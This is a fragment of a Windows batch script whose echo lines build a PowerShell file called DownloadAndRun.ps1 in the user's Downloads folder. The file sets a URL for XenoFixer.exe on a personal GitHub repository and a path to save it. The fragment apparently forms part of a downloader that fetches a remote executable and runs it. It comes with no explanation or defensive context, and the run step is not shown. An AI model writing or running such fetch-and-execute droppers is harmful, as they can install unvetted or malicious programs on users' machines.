...
echo $url = "https://github.com/QwertyCat179/XenoFix/raw/refs/heads/main/XenoFixer.exe" >> "%USERPROFILE%\Downloads\DownloadAndRun.ps1"
echo $output_file = "$env:USERPROFILE\Downloads\XenoFixer.exe" >> "%USERPROFILE%\Downloads\DownloadAndRun.ps1"
